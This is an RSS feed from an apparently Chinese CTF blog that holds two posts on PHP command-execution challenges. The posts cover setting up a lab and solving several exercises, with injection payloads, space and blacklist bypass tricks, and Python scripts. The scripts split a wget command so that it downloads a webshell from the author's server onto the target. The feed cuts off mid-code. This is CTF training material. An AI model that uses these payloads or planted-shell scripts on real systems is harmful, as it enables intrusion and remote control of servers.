<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>yym&#39;s blog</title>
    <link>http://www.yym.show/</link>
    
    <atom:link href="/rss2.html" rel="self" type="application/rss+xml"/>
    
    <description>hello world</description>
    <pubDate>Wed, 08 Jul 2020 08:08:44 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>七字命令执行环境搭建</title>
      <link>http://www.yym.show/2020-07-08-%E4%B8%83%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
      <guid>http://www.yym.show/2020-07-08-%E4%B8%83%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
      <pubDate>Wed, 08 Jul 2020 06:14:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;今天在总结RCE漏洞的时候看到了P神出的七字命令执行，感觉挺NB的，所以想自己搭个环境复现一下，遇到了一些小坑，所以记录一下，哎&lt;del&gt;~&lt;/del&gt;还是太菜的缘故，想的太少，做的太少，环境搭起来都那么费劲，主要就是权限的问题。&lt;/p&gt;
&lt;p&gt;首先给出了源码：&lt;/p&gt;
&lt;
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>今天在总结RCE漏洞的时候看到了P神出的七字命令执行，感觉挺NB的，所以想自己搭个环境复现一下，遇到了一些小坑，所以记录一下，哎<del>~</del>还是太菜的缘故，想的太少，做的太少，环境搭起来都那么费劲，主要就是权限的问题。</p><p>首先给出了源码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">if(strlen($_GET[1])&lt;8)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后本地开启一个<code>httpd</code>服务，这里我选择了用docker搭建，方便快捷，找了个httpd+php的docker镜像</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708144630536.png" alt="image-20200708144630536"></p><p>下载好之后启动</p><p>删除<code>/var/www/html/</code>下的所有文件,然后修改html文件的权限</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708145456517.png" alt="image-20200708145456517"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><p>然后创建inde.php文件,将题目源码放入</p><p>最后还得安装一个<code>wget</code>,先更新源再安装</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install wget</span><br></pre></td></tr></table></figure><p>最后再附上脚本吧</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">def GetShell():</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;192.168.56.150:8080&#x2F;?1&#x3D;&quot;</span><br><span class="line">    fileNames &#x3D; [&quot;hp&quot;, &quot;ell.p\\&quot;, &quot;\ sh\\&quot;, &quot;\ -O\\&quot;, &quot;121\\&quot;,&quot;135.\\&quot;,&quot;76.\\&quot;,&quot;120.\\&quot;,&quot;et\ \\&quot;,&quot;wg\\&quot;]</span><br><span class="line">    # linux创建中间有空格的文件名，需要转义，所以有请求&quot;cn\ \\&quot;</span><br><span class="line">    # 可以修改hosts文件，让a.cn指向一个自己的服务器。</span><br><span class="line">    # 在a.cn 的根目录下创建index.html ，内容是一个php shell</span><br><span class="line">    for fileName in fileNames:</span><br><span class="line">        createFileUrl &#x3D; url + &quot;&gt;&quot; + fileName</span><br><span class="line">        print(createFileUrl)</span><br><span class="line">        requests.get(createFileUrl)</span><br><span class="line"></span><br><span class="line">    getShUrl &#x3D; url + &quot;ls -t&gt;a&quot;</span><br><span class="line">    print(getShUrl)</span><br><span class="line">    requests.get(getShUrl)</span><br><span class="line">    getShellUrl &#x3D; url + &quot;sh a&quot;</span><br><span class="line">    print(getShellUrl)</span><br><span class="line">    requests.get(getShellUrl)</span><br><span class="line">    shellUrl &#x3D; &quot;http:&#x2F;&#x2F;192.168.56.150:8080&#x2F;shell.php&quot;</span><br><span class="line">    response &#x3D; requests.get(shellUrl)</span><br><span class="line">    if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print(</span><br><span class="line">        &quot;[*] Get shell !&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(</span><br><span class="line">        &quot;[*] fail!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    GetShell()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>http://www.yym.show/2020-07-08-%E4%B8%83%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#disqus_thread</comments>
    </item>
    
    <item>
      <title>命令执行&amp;&amp;代码执行刷题记录</title>
      <link>http://www.yym.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/</link>
      <guid>http://www.yym.show/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/</guid>
      <pubDate>Sat, 04 Jul 2020 01:44:00 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h2&gt;&lt;h3 id=&quot;ACTF2020-新生赛-Exec&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-Ex
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>[TOC]</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h3><p><strong>本题要点：</strong></p><ul><li>命令执行</li></ul><p>太简单了，直接放payload吧，直接就读出来了</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target&#x3D;127.0.0.1%7Ccat &#x2F;flag</span><br></pre></td></tr></table></figure><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;cfaaa800-9f82-44ec-b30f-c68d066c299a&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="DVWA-Medium-级别"><a href="#DVWA-Medium-级别" class="headerlink" title="DVWA[Medium]级别"></a>DVWA[Medium]级别</h3><p><strong>本题要点：</strong></p><ul><li>黑名单绕过</li></ul><p>查看源代码，发现有个函数专门用于过滤这两个字符串，而其他地方和low级代码一致：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200706093714336.png" alt="image-20200706093714336"></p><p>但是该级别的缺点是只过滤了上述两种字符，这里我们还可以用&amp;号、管道符|等直接绕过。</p><p>两个命令之间用&amp;号表明这两条命令会同时执行，顺序先后不一定。测试结果如下：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200706093930031.png" alt="image-20200706093930031"></p><hr><h3 id="DVWA-High-级别"><a href="#DVWA-High-级别" class="headerlink" title="DVWA[High]级别"></a>DVWA[High]级别</h3><p><strong>本题要点：</strong></p><ul><li>黑名单绕过</li></ul><p>分析源代码：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200706094319605.png" alt="image-20200706094319605"></p><p>把一些常见的命令连接符给过滤了。黑名单过滤看似安全，但是如果黑名单不全的话，是很容易进行绕过的。我们仔细看黑名单过滤中的<code>|</code>,<code>|</code>后面还有一个空格，所以我们可以进行绕过，输入下面命令绕过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure><hr><h3 id="CTFHUB综合训练"><a href="#CTFHUB综合训练" class="headerlink" title="CTFHUB综合训练"></a>CTFHUB综合训练</h3><p>本题要点：</p><ul><li>空格绕过</li><li>黑名单绕过</li><li>通配符绕过</li></ul><p>payload:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%0acd$&#123;IFS&#125;f***_is_here%0amore$&#123;IFS&#125;f***_102391421621483.php</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p><strong>本题要点：</strong></p><ul><li><p><strong>绕过空格、敏感字符、连接符</strong></p></li><li><p><strong>命令执行变量拼接</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFSfla$a.php</span><br></pre></td></tr></table></figure><p><strong>过滤bash用sh执行</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p><strong>内联执行</strong></p><p>将反引号内命令的输出作为输入执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure></li></ul><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704132418384.png" alt="image-20200704132418384"></p><p>题目为<code>pingpingping</code>,应该就是命令注入，首先尝试传ip,分号连续指令发现没有过滤</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704133322149.png" alt="image-20200704133322149"></p><p>首先尝试读取<code>index.php</code>。发现过滤了空格</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704133411981.png" alt="image-20200704133411981"></p><p>尝试绕过空格，以下是绕过空格的一些方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能</span><br><span class="line">%20 </span><br><span class="line">%09</span><br></pre></td></tr></table></figure><p>$IFS$1绕过成功得到：可以看到过滤了flag</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704133645763.png" alt="image-20200704133645763"></p><p>ps:有时会禁用cat: 解决方法是使用tac反向输出命令： linux命令中可以加\，所以甚至可以ca\t /fl\ag</p><p>过滤了许多标点，空格，bash,包括flag的贪婪匹配。那么自己印象中几种做法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.cat fl* 利用*匹配任意 不行</span><br><span class="line">2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash 也不行</span><br><span class="line">3.ca\t fl\ag.php 不行</span><br><span class="line">4.cat fl&#39;&#39;ag.php 不行</span><br></pre></td></tr></table></figure><p>解决办法：</p><p><strong>变量拼接</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>查看源码得到flag</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/BUUCTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200704134013383.png" alt="image-20200704134013383"></p><p>flag：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;1ab17684-4a64-4da3-a6f0-e6461571f697&#125;</span><br></pre></td></tr></table></figure><p>官方：<br>过滤bash?那就用sh。sh的大部分脚本都可以在bash下运行。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>内联执行的做法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure><p>内联，就是将反引号内命令的输出作为输入执行</p><hr><h3 id="七字绕过命令执行"><a href="#七字绕过命令执行" class="headerlink" title="七字绕过命令执行"></a>七字绕过命令执行</h3><p><strong>本题要点：</strong></p><ul><li><strong>&gt;</strong>重定向符号</li><li>linux中命令换行</li><li>ls -t 命令</li></ul><p>首先查看源码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">if(strlen($_GET[1])&lt;8)&#123;</span><br><span class="line">     echo shell_exec($_GET[1]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码很简单，但是做起来很痛苦</p><p>意思也很简单，主要就是限制了传参的长度，这里的解题思路就是使用wget从vps服务器上下载shell后门，然后连接后门。这里有几个知识点：</p><h4 id="1丶linux中的-gt-符号和-gt-gt-符号"><a href="#1丶linux中的-gt-符号和-gt-gt-符号" class="headerlink" title="1丶linux中的 &gt; 符号和 &gt;&gt; 符号"></a>1丶linux中的 &gt; 符号和 &gt;&gt; 符号</h4><p>1.通过&gt;来创建文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;test.txt</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708153827173.png" alt="image-20200708153827173"></p><p>2.通过&gt;将命令执行的结果存入文件中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;hello world&quot;&gt;test</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708153934111.png" alt="image-20200708153934111"></p><p>但是通过<code>&gt;</code>来将命令执行结果写入文件会覆盖掉文件原本的内容，如果我们想要在原本文件内容后面追加内容就要使用<code>&gt;&gt;</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;aaa&quot;&gt;test</span><br><span class="line">cat test</span><br><span class="line">echo &quot;bbb&quot;&gt;&gt;test</span><br><span class="line">cat test</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154018817.png" alt="image-20200708154018817"></p><h4 id="2丶linux中命令换行"><a href="#2丶linux中命令换行" class="headerlink" title="2丶linux中命令换行"></a>2丶linux中命令换行</h4><p>在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 “\“，可以将一条命令写在多行，“\” 充当拼接符号<br>比如我们有一个test文件内容如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ec\</span><br><span class="line">ho \</span><br><span class="line">hello \</span><br><span class="line">world!</span><br></pre></td></tr></table></figure><p>然后我们用sh命令来执行一下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sh test</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154317883.png" alt="image-20200708154317883"></p><p>成功输出了 hello world!</p><h4 id="3丶ls-t命令"><a href="#3丶ls-t命令" class="headerlink" title="3丶ls -t命令"></a>3丶ls -t命令</h4><p>在linux中，我们使用ls -t命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch a</span><br><span class="line">touch b</span><br><span class="line">touch c</span><br><span class="line">ls -t</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154515655.png" alt="image-20200708154515655"></p><h4 id="4丶利用ls-t-和-gt-以及换行符-绕过长度限制执行命令"><a href="#4丶利用ls-t-和-gt-以及换行符-绕过长度限制执行命令" class="headerlink" title="4丶利用ls -t 和 &gt; 以及换行符 绕过长度限制执行命令"></a>4丶利用ls -t 和 &gt; 以及换行符 绕过长度限制执行命令</h4><p>我们先看执行如下命令的结果：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154556060.png" alt="image-20200708154556060"></p><p>ls -t 命令列出文件名，然后每个文件名按行储存，如果我们将我们要执行的命令拆分为多个文件名，然后再结合命令换行，然后通过 ls -t &gt; test这样的方式再写入某个文件来运行不就可以绕过命令长度限制了吗，而且从上面我们可以看出，ls -t&gt;test的执行顺序是先创建文件test，然后执行ls -t，然后将执行结果写入test文件<br>我们可以做如下小实验：<br>比如我们要执行 echo hello world</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &quot;rld&quot;</span><br><span class="line">&gt; &quot;wo\\&quot;</span><br><span class="line">&gt; &quot;llo \\&quot;</span><br><span class="line">&gt; &quot;he\\&quot;</span><br><span class="line">&gt; &quot;echo \\&quot;</span><br><span class="line">ls -t &gt; _</span><br><span class="line">sh _</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154643363.png" alt="image-20200708154643363"></p><p>我们可以看到，因为我们最后创建的文件 “_”的文件名会输入到文件中导致一个错误信息，但是并不影响我们下面命令的执行，最终成功的输出了 “hello world”</p><p>这里使用了两个 \ 是因为我们需要转义掉多行命令的换行，如果我们只使用一个 \ 那么就会被误解为正在多行执行命令，就会出现下面这种情况</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo \</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154710348.png" alt="image-20200708154710348"></p><h4 id="5丶解题："><a href="#5丶解题：" class="headerlink" title="5丶解题："></a>5丶解题：</h4><p>接下来就能做这道题了</p><p>首先在vps上准备index.html，内容为php webshell</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200708154916611.png" alt="image-20200708154916611"></p><p>这里我使用了蚁剑一键生成的webshell</p><p>然后开始构造命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget 120.76.135.xxx -O shell.php</span><br></pre></td></tr></table></figure><p>120.76.135.xxx为你的vps IP地址或者域名，-O参数是重命名</p><p>我们只需要执行这一条命令就能上传一个木马，然后就需要构造多个文件，使用<code>ls -t</code>将文件名拼接到另一个文件中，执行这个文件</p><p>这里有几个要点：</p><ul><li>文件名开头不能是<code>.</code>，不然<code>ls</code>不能列出，<code>.</code>开头是隐藏文件</li><li>空格和<code>\</code>要用<code>\</code>转义，因为<code>\</code>不转义的话就会执行多行命令，命令不能结束</li></ul><p>然后开始构造语句</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;&gt;l.php</span><br><span class="line">?1&#x3D;&gt;shel\\</span><br><span class="line">?1&#x3D;&gt;-O\ \\</span><br><span class="line">?1&#x3D;&gt;xx\ \\</span><br><span class="line">?1&#x3D;&gt;135.\\</span><br><span class="line">?1&#x3D;&gt;7.76.\\</span><br><span class="line">?1&#x3D;&gt;\ 12\\</span><br><span class="line">?1&#x3D;&gt;wget\\</span><br><span class="line">?1&#x3D;ls -t&gt;a</span><br><span class="line">?1&#x3D;sh a</span><br></pre></td></tr></table></figure><p>贴一下p牛的脚本：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#-*- coding: utf-8 -*- </span><br><span class="line"></span><br><span class="line">import requests </span><br><span class="line">def GetShell():</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;192.168.56.129&#x2F;shell.php?1&#x3D;&quot;</span><br><span class="line">    fileNames &#x3D; [&quot;1.php&quot;,&quot;-O\ \\&quot;,&quot;cn\ \\&quot;,&quot;\ a.\\&quot;,&quot;wget\\&quot;] </span><br><span class="line">    # linux创建中间有空格的文件名，需要转义，所以有请求&quot;cn\ \\&quot;</span><br><span class="line">    # 可以修改hosts文件，让a.cn指向一个自己的服务器。</span><br><span class="line">    # 在a.cn 的根目录下创建index.html ，内容是一个php shell </span><br><span class="line"> </span><br><span class="line">    for fileName in fileNames:</span><br><span class="line">        createFileUrl &#x3D; url+&quot;&gt;&quot;+fileName</span><br><span class="line">        print createFileUrl </span><br><span class="line">        requests.get(createFileUrl)</span><br><span class="line"> </span><br><span class="line">    getShUrl &#x3D; url + &quot;ls -t&gt;1&quot;</span><br><span class="line">    print getShUrl</span><br><span class="line">    requests.get(getShUrl)</span><br><span class="line">    getShellUrl &#x3D; url + &quot;sh 1&quot;</span><br><span class="line">    print getShellUrl</span><br><span class="line">    requests.get(getShellUrl)</span><br><span class="line"> </span><br><span class="line">    shellUrl &#x3D; &quot;http:&#x2F;&#x2F;192.168.56.129&#x2F;1.php&quot;</span><br><span class="line">    response &#x3D; requests.get(shellUrl)</span><br><span class="line">    if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print &quot;[*] Get shell !&quot;</span><br><span class="line">    else :</span><br><span class="line">        print &quot;[*] fail!&quot;</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    GetShell()</span><br></pre></td></tr></table></figure><p>改掉语句就能用蚁剑连了，找一下目录就能得到flag</p><hr><h3 id="五字绕过-HITCON-CTF-2017-BabyFirst-Revenge"><a href="#五字绕过-HITCON-CTF-2017-BabyFirst-Revenge" class="headerlink" title="五字绕过 [HITCON CTF 2017-BabyFirst Revenge]"></a>五字绕过 [HITCON CTF 2017-BabyFirst Revenge]</h3><p><strong>本题要点：</strong></p><ul><li><strong>&gt;</strong>重定向符号</li><li>linux中命令换行</li><li>ls -t 命令绕过</li><li>curl</li></ul><p>源码:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $sandbox &#x3D; &#39;&#x2F;www&#x2F;sandbox&#x2F;&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;&#x3D; 5) &#123;</span><br><span class="line">        @exec($_GET[&#39;cmd&#39;]);</span><br><span class="line">    &#125; else if (isset($_GET[&#39;reset&#39;])) &#123;</span><br><span class="line">        @exec(&#39;&#x2F;bin&#x2F;rm -rf &#39; . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><p>这里需要我们注意的是<code>cmd &lt;= 5</code>，所以我们就不能在使用<code>ls -t&gt;a</code>。</p><p>但是我们还是可以通过比较巧妙的构造来实现<code>ls -t&gt;a</code>这么一个操作的。可以先通过把<code>ls -t&gt;a</code>这样拆分成几段写入到<code>_</code>文件存放。</p><hr><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>首先打开网页观察，发现首页的url有点奇怪，有点像base64编码，然后经过两次base64解密，一次hex解密得到为55.png，然后反向推测index.php，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</span><br></pre></td></tr></table></figure><p>然后查看源码得到：</p><p><img src= "/img/loading.gif" data-src="https://images-1300363852.cos.ap-shanghai.myqcloud.com/CTF%5BWeb%5D/RCE/RCE%E6%80%BB%E7%BB%93image-20200714162512792.png" alt="image-20200714162512792"></p><p>然后base64解码得到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   